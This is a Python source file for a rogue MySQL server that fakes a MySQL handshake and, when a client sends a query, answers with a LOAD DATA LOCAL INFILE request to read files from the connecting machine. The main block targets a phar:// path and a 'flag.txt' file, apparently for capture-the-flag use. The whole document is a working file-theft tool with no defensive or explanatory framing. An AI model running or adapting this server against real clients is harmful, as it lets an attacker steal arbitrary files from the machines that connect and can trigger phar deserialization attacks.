
from socket import AF_INET, SOCK_STREAM, error
from asyncore import dispatcher, loop as _asyLoop
from asynchat import async_chat
from struct import Struct
from sys import version_info
from logging import getLogger, INFO, StreamHandler, Formatter

_rouge_mysql_sever_read_file_result = {

}
_rouge_mysql_server_read_file_end = False


def checkVersionPy3():
    return not version_info < (3, 0)


def rouge_mysql_sever_read_file(fileName, port, showInfo):
    if showInfo:
        log = getLogger(__name__)
        log.setLevel(INFO)
        tmp_format = StreamHandler()
        tmp_format.setFormatter(Formatter("%(asctime)s : %(levelname)s : %(message)s"))
        log.addHandler(
            tmp_format
        )

    def _infoShow(*args):
        if showInfo:
            log.info(*args)

    # ================================================
    # =======No need to change after this lines=======
    # ================================================

    __author__ = 'Gifts'
    __modify__ = 'Morouu'

    global _rouge_mysql_sever_read_file_result

    class _LastPacket(Exception):
        pass

    class _OutOfOrder(Exception):
        pass

    class _MysqlPacket(object):
        packet_header = Struct('<Hbb')
        packet_header_long = Struct('<Hbbb')

        def __init__(self, packet_type, payload):
            if isinstance(packet_type, _MysqlPacket):
                self.packet_num = packet_type.packet_num + 1
            else:
                self.packet_num = packet_type
            self.payload = payload

        def __str__(self):
            payload_len = len(self.payload)
            if payload_len < 65536:
                header = _MysqlPacket.packet_header.pack(payload_len, 0, self.packet_num)
            else:
                header = _MysqlPacket.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

            result = "".join(
                (
                    header.decode("latin1") if checkVersionPy3() else header,
                    self.payload
                )
            )

            return result

        def __repr__(self):
            return repr(str(self))

        @staticmethod
        def parse(raw_data):
            packet_num = raw_data[0] if checkVersionPy3() else ord(raw_data[0])
            payload = raw_data[1:]

            return _MysqlPacket(packet_num, payload.decode("latin1") if checkVersionPy3() else payload)

    class _HttpRequestHandler(async_chat):

        def __init__(self, addr):
            async_chat.__init__(self, sock=addr[0])
            self.addr = addr[1]
            self.ibuffer = []
            self.set_terminator(3)
            self.stateList = [b"LEN", b"Auth", b"Data", b"MoreLength", b"File"] if checkVersionPy3() else ["LEN",
                                                                                                           "Auth",
                                                                                                           "Data",
                                                                                                           "MoreLength",
                                                                                                           "File"]
            self.state = self.stateList[0]
            self.sub_state = self.stateList[1]
            self.logined = False
            self.file = ""
            self.push(
                _MysqlPacket(
                    0,
                    "".join((
                        '\x0a',  # Protocol
                        '5.6.28-0ubuntu0.14.04.1' + '\0',
                        '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                    )))
            )

            self.order = 1
            self.states = [b'LOGIN', b'CAPS', b'ANY'] if checkVersionPy3() else ['LOGIN', 'CAPS', 'ANY']

        def push(self, data):
            _infoShow('Pushed: %r', data)
            data = str(data)
            async_chat.push(self, data.encode("latin1") if checkVersionPy3() else data)

        def collect_incoming_data(self, data):
            _infoShow('Data recved: %r', data)
            self.ibuffer.append(data)

        def found_terminator(self):
            data = b"".join(self.ibuffer) if checkVersionPy3() else "".join(self.ibuffer)
            self.ibuffer = []

            if self.state == self.stateList[0]:  # LEN
                len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1 if checkVersionPy3() else ord(
                    data[0]) + 256 * ord(data[1]) + 65536 * ord(data[2]) + 1
                if len_bytes < 65536:
                    self.set_terminator(len_bytes)
                    self.state = self.stateList[2]  # Data
                else:
                    self.state = self.stateList[3]  # MoreLength
            elif self.state == self.stateList[3]:  # MoreLength
                if (checkVersionPy3() and data[0] != b'\0') or data[0] != '\0':
                    self.push(None)
                    self.close_when_done()
                else:
                    self.state = self.stateList[2]  # Data
            elif self.state == self.stateList[2]:  # Data
                packet = _MysqlPacket.parse(data)
                try:
                    if self.order != packet.packet_num:
                        raise _OutOfOrder()
                    else:
                        # Fix ?
                        self.order = packet.packet_num + 2
                    if packet.packet_num == 0:
                        if packet.payload[0] == '\x03':
                            _infoShow('Query')

                            self.set_terminator(3)
                            self.state = self.stateList[0]  # LEN
                            self.sub_state = self.stateList[4]  # File
                            self.file = fileName.pop(0)

                            # end
                            if len(fileName) == 1:
                                global _rouge_mysql_server_read_file_end
                                _rouge_mysql_server_read_file_end = True

                            self.push(_MysqlPacket(
                                packet,
                                '\xFB{0}'.format(self.file)
                            ))
                        elif packet.payload[0] == '\x1b':
                            _infoShow('SelectDB')
                            self.push(_MysqlPacket(
                                packet,
                                '\xfe\x00\x00\x02\x00'
                            ))
                            raise _LastPacket()
                        elif packet.payload[0] in '\x02':
                            self.push(_MysqlPacket(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise _LastPacket()
                        elif packet.payload == '\x00\x01':
                            self.push(None)
                            self.close_when_done()
                        else:
                            raise ValueError()
                    else:
                        if self.sub_state == self.stateList[4]:  # File
                            _infoShow('-- result')
                            # fileContent
                            _infoShow('Result: %r', data)
                            if len(data) == 1:
                                self.push(
                                    _MysqlPacket(packet, '\0\0\0\x02\0\0\0')
                                )
                                raise _LastPacket()
                            else:
                                self.set_terminator(3)
                                self.state = self.stateList[0]  # LEN
                                self.order = packet.packet_num + 1

                            global _rouge_mysql_sever_read_file_result
                            _rouge_mysql_sever_read_file_result.update(
                                {self.file: data.encode() if not checkVersionPy3() else data}
                            )

                            # test
                            # print(self.file + ":\n" + content.decode() if checkVersionPy3() else content)

                            self.close_when_done()

                        elif self.sub_state == self.stateList[1]:  # Auth
                            self.push(_MysqlPacket(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise _LastPacket()
                        else:
                            _infoShow('-- else')
                            raise ValueError('Unknown packet')
                except _LastPacket:
                    _infoShow('Last packet')
                    self.state = self.stateList[0]  # LEN
                    self.sub_state = None
                    self.order = 0
                    self.set_terminator(3)
                except _OutOfOrder:
                    _infoShow('Out of order')
                    self.push(None)
                    self.close_when_done()
            else:
                _infoShow('Unknown state')
                self.push('None')
                self.close_when_done()

    class _MysqlListener(dispatcher):
        def __init__(self, sock=None):
            dispatcher.__init__(self, sock)

            if not sock:
                self.create_socket(AF_INET, SOCK_STREAM)
                self.set_reuse_addr()
                try:
                    self.bind(('', port))
                except error:
                    exit()

                self.listen(1)

        def handle_accept(self):
            pair = self.accept()

            if pair is not None:
                _infoShow('Conn from: %r', pair[1])
                _HttpRequestHandler(pair)

                if _rouge_mysql_server_read_file_end:
                    self.close()

    _MysqlListener()
    _asyLoop()
    return _rouge_mysql_sever_read_file_result


if __name__ == '__main__':

    for name, content in rouge_mysql_sever_read_file(fileName=["phar://E:\phar.phar", "d:\flag.txt"], port=3307,showInfo=True).items():
        print(name + ":\n" + content.decode())
